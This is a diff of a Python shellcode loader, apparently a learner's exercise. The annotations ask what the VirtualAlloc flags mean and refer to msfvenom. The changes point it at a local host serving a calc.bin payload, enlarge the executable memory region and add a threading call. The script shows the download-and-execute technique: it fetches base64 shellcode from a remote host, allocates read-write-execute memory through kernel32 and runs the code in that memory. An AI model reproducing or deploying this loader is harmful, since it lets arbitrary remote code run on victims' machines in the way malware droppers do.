@@ -2,8 +2,10 @@ from urllib import request
 
 import base64
 import ctypes
+import threading
 
-URL = 'http://192.168.1.145/shellcode.bin'
+# URL = 'http://192.168.1.145/mspaint.bin'
+URL = 'http://192.168.1.145/calc.bin'
 
 #? Proper syntax for shellcode creation in msfvenom for a 64 bit system is:
 
@@ -19,8 +21,10 @@ def get_code(url):
         shellcode = base64.decodebytes(response.read())
     return shellcode
 
+
 def write_memory(buf):
     length = len(buf)
+    length = ctypes.c_size_t(length + (128 * 1024))
 
     kernel32.VirtualAlloc.restype = ctypes.c_void_p
     #* https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
@@ -54,6 +58,8 @@ def write_memory(buf):
         length, #? The size of the region, in bytes
         0x3000, #? The type of memory allocation
         0x40)   #? Memory protection 
+
+    print(ptr)
     
     #! what is 0x3000?
     #! I believe 0X3000 is MEM_COMMIT and MEM_RESERVE in a single call
@@ -106,9 +112,13 @@ if __name__ == '__main__':
     url = URL
     shellcode = get_code(URL)
 
+    # print(shellcode)
+    # shellcode = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+
     try:
         run(shellcode)
+        exe_shell = threading.Thread(target='run', args=(shellcode,))
+        exe_shell.run()
     except Exception as e:
         print(f'Will Python crash?  {e}')
     #? the run function will call write_memory 
-
